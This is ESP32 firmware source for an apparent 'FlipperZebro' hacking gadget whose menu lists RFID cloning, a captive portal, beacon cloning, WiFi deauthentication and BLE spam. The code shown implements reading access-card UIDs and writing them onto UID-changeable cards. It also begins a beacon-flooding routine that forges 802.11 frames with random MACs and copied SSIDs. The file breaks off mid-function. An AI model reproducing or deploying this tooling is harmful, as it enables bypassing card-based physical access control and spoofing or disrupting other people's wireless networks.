#include <Wire.h>
#include <LiquidCrystal_I2C.h>
#include <SPI.h>
#include <MFRC522.h>
#include <Preferences.h>
#include <WiFi.h>
//#include <Adafruit_PN532.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

#define RST_PIN 27
#define SS_PIN 5
#define LED 2
#define RELAY_PIN 25

MFRC522 mfrc522(SS_PIN, RST_PIN);
//Adafruit_PN532 nfc(21, 22);
MFRC522::MIFARE_Key key;

// Define for Beacon Function
char baseSsid[5][32];
char ssids[50][32];
int numSsids = 0;
uint8_t channel;

uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00,
                        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                        0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
                        0xc0, 0x6c,
                        0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
                        0x64, 0x00,
                        0x01, 0x04,
                        0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
                        0x01, 0x08, 0x82, 0x84,
                        0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
                        0x04 };
// END of Define Beacon

// Define For Captive Portal //
const byte DNS_PORT = 53;
String responseHTML;
IPAddress apIP(8, 8, 4, 4);  // The default android DNS
DNSServer dnsServer;
WiFiServer server(80);
// End Define Captive

// Pengaturan pin tombol CHANGE dan OK
const int CHANGE_PIN = 14;
const int BACK_PIN = 12;
const int OK_PIN = 13;
const int maxAllowedCards = 3;
String allowedUIDs[maxAllowedCards];  // Array to store allowed UIDs
int numAllowedCards = 0;              // Number of cards currently in the array
int NFCAllowedCards = 0;
String NFCallowedUIDs[maxAllowedCards];


// Storing UIDs with byte
const int maxUIDs = 3;           // maximum number of UIDs that can be stored
const int uidSize = 4;           // size of each UID
byte uidList[maxUIDs][uidSize];  // 2D array to store UIDs
int uidCount = 0;                // Counter for the number of UIDs stored


// Inisialisasi LCD 16x2
LiquidCrystal_I2C lcd(0x27, 16, 2);

// Deklarasi variabel menu
int currentMenu = 1;
int currentSubMenuRFID = 1, currentSubMenuNFC = 1;
int selectedCard = 1;
boolean inSubMenu = false;
boolean inListMenu = false;

Preferences preferences, NFCPreferences;

void setup() {
  // Inisialisasi komunikasi serial
  Serial.begin(115200);
  SPI.begin();         // init SPI bus
  mfrc522.PCD_Init();  // init MFRC522
  //nfc.begin();         // init PN532
  //nfc.SAMConfig();
  pinMode(RELAY_PIN, OUTPUT);
  digitalWrite(RELAY_PIN, LOW);
  
  // Inisialisasi LCD
  lcd.init();
  lcd.backlight();

  // Inisialisasi pin tombol CHANGE dan OK sebagai input
  pinMode(CHANGE_PIN, INPUT_PULLUP);
  pinMode(BACK_PIN, INPUT_PULLUP);
  pinMode(OK_PIN, INPUT_PULLUP);
  Serial.println("Ready");

  // Begin Preferences with the app name and storage namespace
  preferences.begin("cardSaved", false);
  NFCPreferences.begin("NFCSaved", false);
  loadFromPreferences();
  // Tampilkan menu awal
  displayMenu();
}

void storeUID(byte *uid) {
  if (uidCount < maxUIDs) {
    for (int i = 0; i < uidSize; i++) {
      uidList[uidCount][i] = uid[i];
    }
    uidCount++;
  } else {
    // Handle case when UID limit is reached
    Serial.println("UID storage limit reached.");
  }
}

/*void saveToPreferences(String uid) {
  // Save the UID to preferences
  for (int i = 0; i < maxAllowedCards; i++) {
    String key = "UID_" + String(i);
    String value = preferences.getString(key.c_str(), "");
    if (value == "") {
      // Found an empty slot, save the UID
      preferences.putString(key.c_str(), uid);
      break;
    }
  }
}*/

/*void saveNFCToPreferences(String uid) {
  // Save the UID to preferences for NFC
  for (int i = 0; i < maxAllowedCards; i++) {
    String key = "NFC_UID_" + String(i);
    String value = NFCPreferences.getString(key.c_str(), "");
    if (value == "") {
      // Found an empty slot, save the UID
      NFCPreferences.putString(key.c_str(), uid);
      break;
    }
  }
}*/

void loadFromPreferences() {
  // Load the UIDs from preferences
  for (int i = 0; i < maxAllowedCards; i++) {
    String key = "UID_" + String(i);
    String uid = preferences.getString(key.c_str(), "");
    if (uid != "") {
      allowedUIDs[numAllowedCards++] = uid;
    }
  }

  for (int i = 0; i < maxAllowedCards; i++) {
    String key = "NFC_UID_" + String(i);
    String uid = NFCPreferences.getString(key.c_str(), "");
    if (uid != "") {
      NFCallowedUIDs[NFCAllowedCards++] = uid;
    }
  }
}

void loop() {
  // Baca nilai tombol CHANGE dan OK
  int changeButton = digitalRead(CHANGE_PIN);
  int okButton = digitalRead(OK_PIN);
  int backButton = digitalRead(BACK_PIN);

  // Jika tombol CHANGE ditekan dan tidak sedang di dalam sub-menu
  if (changeButton == LOW && !inSubMenu) {
    // Tunggu hingga tombol CHANGE dilepaskan
    while (digitalRead(CHANGE_PIN) == LOW)
      ;

    // Ubah menu yang ditampilkan
    currentMenu++;
    if (currentMenu > 6) {
      currentMenu = 1;
    }

    // Tampilkan menu baru
    displayMenu();

    // Tunggu selama 0,5 detik sebelum memeriksa tombol CHANGE lagi
    delay(200);
  }

  // Jika tombol OK ditekan
  if (okButton == LOW && !inSubMenu) {
    // Tunggu hingga tombol OK dilepaskan
    while (digitalRead(OK_PIN) == LOW)
      ;

    // Mengeksekusi menu yang dipilih berdasarkan variabel currentMenu
    executeMenu();

    // Tunggu selama 0,5 detik sebelum memeriksa tombol OK lagi
    delay(200);
  }
  if (backButton == LOW && !inSubMenu) {
    // Tunggu hingga tombol CHANGE dilepaskan
    while (digitalRead(BACK_PIN) == LOW)
      ;
    executeSleep();
    // Tampilkan menu baru
    displayMenu();

    // Tunggu selama 0,5 detik sebelum memeriksa tombol CHANGE lagi
    delay(200);
  }
}

void displayMenu() {
  // Hapus tampilan LCD
  lcd.clear();

  // Tampilkan menu sesuai variabel currentMenu
  switch (currentMenu) {
    case 1:
      lcd.setCursor(0, 0);
      lcd.print("FZebro Menu:");
      lcd.setCursor(0, 1);
      lcd.print("1. RFID Clone");
      break;
    case 2:
      lcd.setCursor(0, 0);
      lcd.print("FZebro Menu:");
      lcd.setCursor(0, 1);
      lcd.print("2. Cap-Portal");
      break;
    case 3:
      lcd.setCursor(0, 0);
      lcd.print("FZebro Menu:");
      lcd.setCursor(0, 1);
      lcd.print("3. Beacon Clone");
      break;
    case 4:
      lcd.setCursor(0, 0);
      lcd.print("FZebro Menu:");
      lcd.setCursor(0, 1);
      lcd.print("4. Deauth WiFi");
      break;
    case 5:
      lcd.setCursor(0, 0);
      lcd.print("FZebro Menu:");
      lcd.setCursor(0, 1);
      lcd.print("5. BLE Spam");
      break;
    case 6:
      lcd.setCursor(0, 0);
      lcd.print("FZebro Menu:");
      lcd.setCursor(0, 1);
      lcd.print("6. Sleep");
      break;
  }
}

void executeMenu() {
  inSubMenu = true;  // Set to true when entering a sub-menu

  // Mengeksekusi menu yang dipilih berdasarkan variabel currentMenu
  switch (currentMenu) {
    case 1:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("You selected:");
      lcd.setCursor(0, 1);
      lcd.print("1. RFID Clone");
      delay(500);
      executeSubMenuRFID();
      break;
    case 2:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("You selected:");
      lcd.setCursor(0, 1);
      lcd.print("2. Cap Portal");
      delay(500);
      executeSubMenuCPortal();
      break;
    case 3:
      executeSubMenuBeacon();
      delay(500);
      break;
    case 4:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("You selected:");
      lcd.setCursor(0, 1);
      lcd.print("4. Deauth WiFi");
      delay(500);
      executeSubMenuDeauth();
      break;
    case 5:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("You selected:");
      lcd.setCursor(0, 1);
      lcd.print("5. BLE Spam");
      delay(500);
      executeSubMenuBLE();
      break;
    case 6:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("You selected:");
      lcd.setCursor(0, 1);
      lcd.print("6. Sleep");
      executeSleep();
      break;
  }

  inSubMenu = false;  // Set back to false when sub-menu operation is completed
}

// FUNGSI SLEEP
void executeSleep() {
  inSubMenu = true;
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Sleep Mode in: ");
  lcd.setCursor(0, 1);
  for (int i = 3; i > 0; i--) {
    lcd.setCursor(0, 1);
    lcd.print(" >> ");
    lcd.print(i);
    lcd.print(" seconds");
    delay(1000);  // Wait for one second
  }
  lcd.noBacklight();
  while (digitalRead(OK_PIN) == HIGH && digitalRead(CHANGE_PIN) == HIGH) {
    delay(1);
  }
  displayMenu();
  lcd.backlight();
  inSubMenu = false;
}

// FUNGSI RFID (MFRC522)
void displaySubMenuRFID() {
  inSubMenu = true;
  // Hapus tampilan LCD
  lcd.clear();

  // Tampilkan menu sesuai variabel currentMenu
  switch (currentSubMenuRFID) {
    case 1:
      lcd.setCursor(0, 0);
      lcd.print("RFID Menu:");
      lcd.setCursor(0, 1);
      lcd.print("1. Scan");
      break;
    case 2:
      lcd.setCursor(0, 0);
      lcd.print("RFID Menu:");
      lcd.setCursor(0, 1);
      lcd.print("2. Clone");
      break;
    case 3:
      lcd.setCursor(0, 0);
      lcd.print("RFID Menu:");
      lcd.setCursor(0, 1);
      lcd.print("3. Delete");
      break;
    case 4:
      lcd.setCursor(0, 0);
      lcd.print("RFID Menu:");
      lcd.setCursor(0, 1);
      lcd.print("4. Back");
      break;
  }
}
void executeSubMenuRFID() {
  inSubMenu = true;
  displaySubMenuRFID();

  while (inSubMenu) {
    int okButtonRFID = digitalRead(OK_PIN);
    int changeButtonRFID = digitalRead(CHANGE_PIN);
    int backButtonRFID = digitalRead(BACK_PIN);

    if (changeButtonRFID == LOW) {
      while (digitalRead(CHANGE_PIN) == LOW)
        ;
      // Ubah menu yang ditampilkan
      currentSubMenuRFID++;
      if (currentSubMenuRFID > 4) {
        currentSubMenuRFID = 1;
      }
      // Tampilkan menu baru
      displaySubMenuRFID();

      // Tunggu selama 0,5 detik sebelum memeriksa tombol CHANGE lagi
      delay(200);
    }

    if (backButtonRFID == LOW) {
      while (digitalRead(BACK_PIN) == LOW)
        ;
      // Ubah menu yang ditampilkan
      inSubMenu = false;
      displayMenu();
      break;
    }

    if (okButtonRFID == LOW) {
      while (digitalRead(OK_PIN) == LOW)
        ;

      switch (currentSubMenuRFID) {
        case 1:
          // Pilihan 1: Scan
          executeRFIDScan();
          break;
        case 2:
          // Pilihan 2: View
          executeRFIDView();
          break;
        case 3:
          // Pilihan 3: Delete
          executeRFIDDelete();
          break;
        case 4:
          // Pilihan 3: Back to Main Menu
          inSubMenu = false;
          displayMenu();
          break;
      }
    }
  }
}
void executeRFIDScan() {
  bool scanDetected = false;
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Tap your Card!");
  lcd.setCursor(0, 1);
  lcd.print("FlipperZebro");

  // Lakukan pengujian ulang untuk menghindari false positive
  while (!mfrc522.PICC_IsNewCardPresent() && !mfrc522.PICC_ReadCardSerial() && !scanDetected) {
    if (mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial()) {
      // Cetak UID kartu RFID
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("UID:");
      lcd.setCursor(0, 1);
      String content = "";
      byte newUid[uidSize];
      for (byte i = 0; i < mfrc522.uid.size; i++) {
        lcd.print(mfrc522.uid.uidByte[i] < 0x10 ? " 0" : " ");
        lcd.print(mfrc522.uid.uidByte[i], HEX);
        content.concat(String(mfrc522.uid.uidByte[i] < 0x10 ? " 0" : " "));
        content.concat(String(mfrc522.uid.uidByte[i], HEX));

        newUid[i] = mfrc522.uid.uidByte[i];
      }
      storeUID(newUid);
      delay(2000);
      // Check if the scanned UID is already in the list of allowed UIDs
      content.toUpperCase();
      bool accessGranted = false;
      for (int i = 0; i < numAllowedCards; i++) {
        if (content.substring(1) == allowedUIDs[i]) {
          accessGranted = true;
          break;
        }
      }
      // If the scanned UID is not in the list, prompt the user to accept or reject the card
      if (!accessGranted) {
        lcd.setCursor(0, 0);
        lcd.print("   New Card    ");
        lcd.setCursor(0, 1);
        lcd.print("== Detected! == ");
        delay(500);
        lcd.clear();
        lcd.setCursor(0, 0);
        lcd.print(" Save New Card ?");
        lcd.setCursor(0, 1);
        lcd.print(" 1: YES | 2: NO ");

        while (digitalRead(OK_PIN) == HIGH && digitalRead(CHANGE_PIN) == HIGH && digitalRead(BACK_PIN) == HIGH) {
          delay(100);
        }

        if (digitalRead(CHANGE_PIN) == LOW) {
          // Accept the card and save it to the allowed list
          if (numAllowedCards < maxAllowedCards) {
            allowedUIDs[numAllowedCards++] = content.substring(1);
            Serial.println("New card added to the allowed list");
            lcd.clear();
            lcd.setCursor(0, 0);
            lcd.print("   New Card     ");
            lcd.setCursor(0, 1);
            lcd.print("== Accepted! == ");
            //saveToPreferences(content.substring(1));
            accessGranted = true;  // Set accessGranted to true when card is accepted
            delay(500);
          } else {
            Serial.println("Cannot accept more cards, limit reached");
            lcd.clear();
            lcd.setCursor(0, 0);
            lcd.print("XX   Limit    XX");
            lcd.setCursor(0, 1);
            lcd.print("XX  Reached!  XX");
            delay(1000);
          }
        } else if (digitalRead(OK_PIN) == LOW) {
          //Reject the card
          Serial.println("Card rejected");
          lcd.clear();
          lcd.setCursor(0, 0);
          lcd.print("XX    Card    XX");
          lcd.setCursor(0, 1);
          lcd.print("XX  Rejected! XX");
          delay(1000);
        } else if (digitalRead(BACK_PIN) == LOW) {
          while (digitalRead(BACK_PIN) == LOW)
            ;
          lcd.clear();
          lcd.setCursor(0, 0);
          displaySubMenuRFID();
          break;
        }
      }
      if (accessGranted) {
        lcd.clear();
        lcd.setCursor(0, 0);
        lcd.print("   Your Card     ");
        lcd.setCursor(0, 1);
        lcd.print(" Already Saved!  ");
        delay(1000);
      }
      scanDetected = true;
      inSubMenu = true;
      displaySubMenuRFID();
      break;
    } else if (digitalRead(BACK_PIN) == LOW) {
      while (digitalRead(BACK_PIN) == LOW)
        ;
      lcd.clear();
      lcd.setCursor(0, 0);
      displaySubMenuRFID();
      break;
    }
  }
}
void executeRFIDDelete() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Deleting RFID...");
  delay(1000);

  // Tampilkan daftar UID kartu yang sudah disimpan
  if (numAllowedCards <= 0) {
    lcd.setCursor(0, 1);
    lcd.print("RFID not found!");
    preferences.clear();
    delay(1000);
  } else {
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Select RFID");
    displayListRFID();
    inListMenu = true;
    while (inListMenu) {
      // Baca nilai tombol CHANGE dan OK
      int changeButton = digitalRead(CHANGE_PIN);
      int okButton = digitalRead(OK_PIN);
      int backButton = digitalRead(BACK_PIN);

      if (changeButton == LOW) {
        while (digitalRead(CHANGE_PIN) == LOW)
          ;
        selectedCard++;
        if (selectedCard > numAllowedCards) {
          selectedCard = 1;
        }
        displayListRFID();
      }

      if (backButton == LOW) {
        while (digitalRead(BACK_PIN) == LOW)
          ;
        lcd.clear();
        break;  // Keluar dari loop jika OK ditekan
      }

      if (okButton == LOW) {
        while (digitalRead(OK_PIN) == LOW)
          ;

        // Remove the selected card from Preferences
        String key = "UID_" + String(selectedCard - 1);
        preferences.remove(key.c_str());

        // Hapus kartu yang dipilih dari daftar
        String deletedUID = allowedUIDs[selectedCard - 1];
        for (int i = selectedCard - 1; i < numAllowedCards - 1; i++) {
          allowedUIDs[i] = allowedUIDs[i + 1];
        }
        numAllowedCards--;

        if (numAllowedCards <= 0) {
          preferences.clear();
        }

        lcd.clear();
        lcd.setCursor(0, 0);
        lcd.print("RFID Deleted!");
        lcd.setCursor(0, 1);
        lcd.print("UID: " + deletedUID);
        delay(1000);

        // Save the changes to Preferences
        saveSettings();
        loadSettings();

        break;  // Keluar dari loop jika OK ditekan
      }
    }
  }
  inSubMenu = true;
  displaySubMenuRFID();
}
void displayListRFID() {
  lcd.clear();
  switch (selectedCard) {
    case 1:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print(selectedCard);
      lcd.print(". Card UID:");
      lcd.setCursor(0, 1);
      lcd.print(allowedUIDs[selectedCard - 1]);
      break;
    case 2:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print(selectedCard);
      lcd.print(". Card UID:");
      lcd.setCursor(0, 1);
      lcd.print(allowedUIDs[selectedCard - 1]);
      break;
    case 3:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print(selectedCard);
      lcd.print(". Card UID:");
      lcd.setCursor(0, 1);
      lcd.print(allowedUIDs[selectedCard - 1]);
      break;
  }
}

void executeRFIDView() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("List RFIDs...");
  delay(1000);

  // Tampilkan daftar UID kartu yang sudah disimpan
  if (numAllowedCards <= 0) {
    lcd.setCursor(0, 1);
    lcd.print("RFID not found!");
    delay(1000);
  } else {
    displayListRFID();
    inListMenu = true;
    while (inListMenu) {
      // Baca nilai tombol CHANGE dan OK
      int changeButton = digitalRead(CHANGE_PIN);
      int backButton = digitalRead(BACK_PIN);

      if (changeButton == LOW) {
        while (digitalRead(CHANGE_PIN) == LOW)
          ;
        selectedCard++;
        if (selectedCard > numAllowedCards) {
          selectedCard = 1;
        }
        displayListRFID();
      }

      if (backButton == LOW) {
        while (digitalRead(BACK_PIN) == LOW)
          ;

        if (numAllowedCards <= 0) {
          preferences.clear();
        }
        lcd.clear();
        break;  // Keluar dari loop jika OK ditekan
      }

      if (digitalRead(OK_PIN) == LOW) {
        while (digitalRead(OK_PIN) == LOW)
          ;
        Serial.println(F("Warning: this example overwrites the UID of your UID changeable card, use with care!"));
        lcd.clear();
        lcd.setCursor(0, 0);
        lcd.print("Take Rewriteable");
        lcd.setCursor(0, 1);
        lcd.print("Card and Tap ...");
        while (digitalRead(BACK_PIN) == HIGH) {
          while (!mfrc522.PICC_IsNewCardPresent() || !mfrc522.PICC_ReadCardSerial()) {
            delay(50);
          }

          // Now a card is selected. The UID and SAK is in mfrc522.uid.

          // Dump UID
          Serial.print(F("Card UID:"));
          for (byte i = 0; i < mfrc522.uid.size; i++) {
            Serial.print(mfrc522.uid.uidByte[i] < 0x10 ? " 0" : " ");
            Serial.print(mfrc522.uid.uidByte[i], HEX);
          }
          Serial.println();

          // Set the new UID
          /*newUidString = "B0FDD221";
          int numBytes = newUidString.length() / 2;
          newUid[numBytes];
          hexStringToByteArray(newUidString, newUid, numBytes);*/
          //Serial.println(newUid);

          if (digitalRead(BACK_PIN) == HIGH && mfrc522.MIFARE_SetUid(uidList[selectedCard - 1], (byte)uidSize, true)) {
            Serial.println(F("Wrote new UID to card."));
            lcd.clear();
            lcd.setCursor(0, 0);
            lcd.print(" Success Wrote: ");
            lcd.setCursor(0, 1);
            lcd.print(allowedUIDs[selectedCard - 1]);
            delay(2000);
            displaySubMenuRFID();
            break;
          } else {
            lcd.clear();
            lcd.setCursor(0, 0);
            lcd.print("!Failed Writing!");
            lcd.setCursor(0, 1);
            lcd.print(allowedUIDs[selectedCard - 1]);
            delay(2000);
            break;
          }

          // Halt PICC and re-select it so DumpToSerial doesn't get confused
          mfrc522.PICC_HaltA();
          if (!mfrc522.PICC_IsNewCardPresent() || !mfrc522.PICC_ReadCardSerial()) {
            return;
          }

          // Dump the new memory contents
          Serial.println(F("New UID and contents:"));
          mfrc522.PICC_DumpToSerial(&(mfrc522.uid));
          delay(2000);

          if (digitalRead(BACK_PIN) == LOW) {
            lcd.clear();
            displaySubMenuRFID();
            break;
          }
        }
        break;
      }
    }
  }
  inSubMenu = true;
  displaySubMenuRFID();
}

// FUNGSI NFC (PN532)
/*void displaySubMenuNFC() {
  inSubMenu = true;
  // Clear LCD display
  lcd.clear();

  // Display menu based on currentSubMenuNFC variable
  switch (currentSubMenuNFC) {
    case 1:
      lcd.setCursor(0, 0);
      lcd.print("NFC Menu:");
      lcd.setCursor(0, 1);
      lcd.print("1. Scan");
      break;
    case 2:
      lcd.setCursor(0, 0);
      lcd.print("NFC Menu:");
      lcd.setCursor(0, 1);
      lcd.print("2. View");
      break;
    case 3:
      lcd.setCursor(0, 0);
      lcd.print("NFC Menu:");
      lcd.setCursor(0, 1);
      lcd.print("3. Delete");
      break;
    case 4:
      lcd.setCursor(0, 0);
      lcd.print("NFC Menu:");
      lcd.setCursor(0, 1);
      lcd.print("4. Back");
      break;
  }
}
void executeSubMenuNFC() {
  inSubMenu = true;
  displaySubMenuNFC();

  while (inSubMenu) {
    int okButtonNFC = digitalRead(OK_PIN);
    int changeButtonNFC = digitalRead(CHANGE_PIN);
    int backButtonNFC = digitalRead(BACK_PIN);

    if (changeButtonNFC == LOW) {
      while (digitalRead(CHANGE_PIN) == LOW)
        ;
      // Change displayed menu
      currentSubMenuNFC++;
      if (currentSubMenuNFC > 4) {
        currentSubMenuNFC = 1;
      }
      // Display new menu
      displaySubMenuNFC();
      delay(200);
    }

    if (backButtonNFC == LOW) {
      while (digitalRead(BACK_PIN) == LOW)
        ;
      // Change displayed menu
      inSubMenu = false;
      displayMenu();
      break;
    }

    if (okButtonNFC == LOW) {
      while (digitalRead(OK_PIN) == LOW)
        ;

      switch (currentSubMenuNFC) {
        case 1:
          // Option 1: Scan
          //executeNFCTagScan();
          break;
        case 2:
          // Option 2: View
          //executeNFCTagView();
          break;
        case 3:
          // Option 3: Delete
          //executeNFCTagDelete();
          break;
        case 4:
          // Option 4: Back to Main Menu
          inSubMenu = false;
          displayMenu();
          break;
      }
    }
  }
}
void executeNFCTagScan() {
  bool scanDetected = false;
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Tap your NFC!");
  lcd.setCursor(0, 1);
  lcd.print("FlipperZebro");

  uint8_t uid[] = { 0, 0, 0, 0, 0, 0, 0 };
  uint8_t uidLength;

  while (!scanDetected) {
    // Lakukan pengujian ulang untuk menghindari false positive
    if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength)) {
      // Cetak UID kartu RFID
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("UID:");
      lcd.setCursor(0, 1);
      String scannedUID = "";
      for (uint8_t i = 0; i < uidLength; i++) {
        Serial.print(uid[i] < 0x10 ? " 0" : " ");
        Serial.print(uid[i], HEX);
        lcd.print(uid[i] < 0x10 ? " 0" : " ");
        lcd.print(uid[i], HEX);
        scannedUID.concat(uid[i] < 0x10 ? " 0" : " ");
        scannedUID.concat(String(uid[i], HEX));
      }
      Serial.println("");
      delay(1000);
      // Check if the scanned UID is already in the list of allowed UIDs
      scannedUID.toUpperCase();
      bool accessGranted = false;
      for (int i = 0; i < NFCAllowedCards; i++) {
        if (scannedUID.substring(1) == NFCallowedUIDs[i]) {
          accessGranted = true;
          break;
        }
      }
      // If the scanned UID is not in the list, prompt the user to accept or reject the card
      if (!accessGranted) {
        lcd.setCursor(0, 0);
        lcd.print("   New Card    ");
        lcd.setCursor(0, 1);
        lcd.print("== Detected! == ");
        //delay(1000);
        lcd.clear();
        lcd.setCursor(0, 0);
        lcd.print(" Save New Card ?");
        lcd.setCursor(0, 1);
        lcd.print(" 1: YES | 2: NO ");

        while (digitalRead(OK_PIN) == HIGH && digitalRead(CHANGE_PIN) == HIGH && digitalRead(BACK_PIN) == HIGH) {
          delay(100);
        }

        if (digitalRead(CHANGE_PIN) == LOW) {
          // Accept the card and save it to the allowed list
          if (NFCAllowedCards < maxAllowedCards) {
            NFCallowedUIDs[NFCAllowedCards++] = scannedUID.substring(1);
            Serial.println("New card added to the allowed list");
            lcd.clear();
            lcd.setCursor(0, 0);
            lcd.print("   New Card     ");
            lcd.setCursor(0, 1);
            lcd.print("== Accepted! == ");
            saveNFCToPreferences(scannedUID.substring(1));
            accessGranted = true;  // Set accessGranted to true when card is accepted
            delay(1000);
          } else {
            Serial.println("Cannot accept more cards, limit reached");
            lcd.clear();
            lcd.setCursor(0, 0);
            lcd.print("XX   Limit    XX");
            lcd.setCursor(0, 1);
            lcd.print("XX  Reached!  XX");
            delay(1000);
          }
        } else if (digitalRead(OK_PIN) == LOW) {
          //Reject the card
          Serial.println("Card rejected");
          lcd.clear();
          lcd.setCursor(0, 0);
          lcd.print("XX    Card    XX");
          lcd.setCursor(0, 1);
          lcd.print("XX  Rejected! XX");
          delay(1000);
        } else if (digitalRead(BACK_PIN) == LOW) {
          while (digitalRead(BACK_PIN) == LOW)
            ;
          lcd.clear();
          lcd.setCursor(0, 0);
          displaySubMenuNFC();
          break;
        }
      }
      if (accessGranted) {
        lcd.clear();
        lcd.setCursor(0, 0);
        lcd.print("   Your Card     ");
        lcd.setCursor(0, 1);
        lcd.print(" Already Saved!  ");
        delay(1000);
      }
    }
    inSubMenu = true;
    scanDetected = true;
    displaySubMenuNFC();
    break;
  }
}
void executeNFCTagDelete() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Deleting NFC...");
  delay(1000);

  // Tampilkan daftar UID kartu yang sudah disimpan
  if (NFCAllowedCards <= 0) {
    lcd.setCursor(0, 1);
    lcd.print("NFC not found!");
    NFCPreferences.clear();
    delay(1000);
  } else {
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Select NFC");
    displayListNFC();
    inListMenu = true;
    while (inListMenu) {
      // Baca nilai tombol CHANGE dan OK
      int changeButton = digitalRead(CHANGE_PIN);
      int okButton = digitalRead(OK_PIN);
      int backButton = digitalRead(BACK_PIN);

      if (changeButton == LOW) {
        while (digitalRead(CHANGE_PIN) == LOW)
          ;
        selectedCard++;
        if (selectedCard > NFCAllowedCards) {
          selectedCard = 1;
        }
        displayListNFC();
      }

      if (backButton == LOW) {
        while (digitalRead(BACK_PIN) == LOW)
          ;
        lcd.clear();
        break;  // Keluar dari loop jika OK ditekan
      }

      if (okButton == LOW) {
        while (digitalRead(OK_PIN) == LOW)
          ;

        // Remove the selected card from Preferences
        String key = "NFC_UID_" + String(selectedCard - 1);
        NFCPreferences.remove(key.c_str());

        // Hapus kartu yang dipilih dari daftar
        String deletedUID = NFCallowedUIDs[selectedCard - 1];
        for (int i = selectedCard - 1; i < NFCAllowedCards - 1; i++) {
          NFCallowedUIDs[i] = NFCallowedUIDs[i + 1];
        }
        NFCAllowedCards--;

        if (NFCAllowedCards <= 0) {
          NFCPreferences.clear();
        }

        lcd.clear();
        lcd.setCursor(0, 0);
        lcd.print("NFC Deleted!");
        lcd.setCursor(0, 1);
        lcd.print("UID: " + deletedUID);
        delay(1000);

        // Save the changes to Preferences
        saveSettings();
        loadSettings();

        break;  // Keluar dari loop jika OK ditekan
      }
    }
  }
  inSubMenu = true;
  displaySubMenuNFC();
}
void executeNFCTagView() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("List NFCs...");
  delay(1000);

  // Tampilkan daftar UID kartu yang sudah disimpan
  if (NFCAllowedCards <= 0) {
    lcd.setCursor(0, 1);
    lcd.print("NFC not found!");
    delay(1000);
  } else {
    displayListNFC();
    inListMenu = true;
    while (inListMenu) {
      // Baca nilai tombol CHANGE dan OK
      int changeButton = digitalRead(CHANGE_PIN);
      int backButton = digitalRead(BACK_PIN);

      if (changeButton == LOW) {
        while (digitalRead(CHANGE_PIN) == LOW)
          ;
        selectedCard++;
        if (selectedCard > NFCAllowedCards) {
          selectedCard = 1;
        }
        displayListNFC();
      }

      if (backButton == LOW) {
        while (digitalRead(BACK_PIN) == LOW)
          ;

        if (NFCAllowedCards <= 0) {
          NFCPreferences.clear();
        }
        lcd.clear();
        break;  // Keluar dari loop jika OK ditekan
      }
    }
  }
  inSubMenu = true;
  displaySubMenuNFC();
}
void displayListNFC() {
  lcd.clear();
  switch (selectedCard) {
    case 1:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print(selectedCard);
      lcd.print(". Card UID:");
      lcd.setCursor(0, 1);
      lcd.print(NFCallowedUIDs[selectedCard - 1]);
      break;
    case 2:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print(selectedCard);
      lcd.print(". Card UID:");
      lcd.setCursor(0, 1);
      lcd.print(NFCallowedUIDs[selectedCard - 1]);
      break;
    case 3:
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print(selectedCard);
      lcd.print(". Card UID:");
      lcd.setCursor(0, 1);
      lcd.print(NFCallowedUIDs[selectedCard - 1]);
      break;
  }
}*/

// WIFI BEACON FUNCTION //
void executeSubMenuBeacon() {
  WiFi.mode(WIFI_STA);

  // Perform WiFi scan
  scanNetworks();

  // Choose 5 random SSIDs from the scanned list as the initial baseSsid
  for (int i = 0; i < 5; ++i) {
    int randomIndex = random(numSsids);
    strncpy(baseSsid[i], ssids[randomIndex], sizeof(baseSsid[i]) - 1);
    baseSsid[i][sizeof(baseSsid[i]) - 1] = '\0';  // Ensure null-termination
  }
  // Generate 50 shuffled SSIDs
  generateShuffledSsids();
  loopInBeacon();
}
void loopInBeacon() {
  inSubMenu = true;
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print(" Beacon Init'd! ");
  lcd.setCursor(0, 1);
  lcd.print("Spamming SSIDs..");
  while (digitalRead(BACK_PIN) == HIGH && inSubMenu) {
    if (digitalRead(BACK_PIN) == LOW && inSubMenu) {
      while (digitalRead(BACK_PIN) == LOW)
        ;
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print(" BeaconStopped! ");
      lcd.setCursor(0, 1);
      lcd.print("  Back to Menu  ");
      delay(1500);
      inSubMenu = false;
      displayMenu();
      break;
    }

    channel = random(1, 12);
    WiFi.channel(channel);

    packet[10] = packet[16] = random(256);
    packet[11] = packet[17] = random(256);
    packet[12] = packet[18] = random(256);
    packet[13] = packet[19] = random(256);
    packet[14] = packet[20] = random(256);
    packet[15] = packet[21] = random(256);

    // Use a randomly selected shuffled SSID
    int randomIndex = random(50);
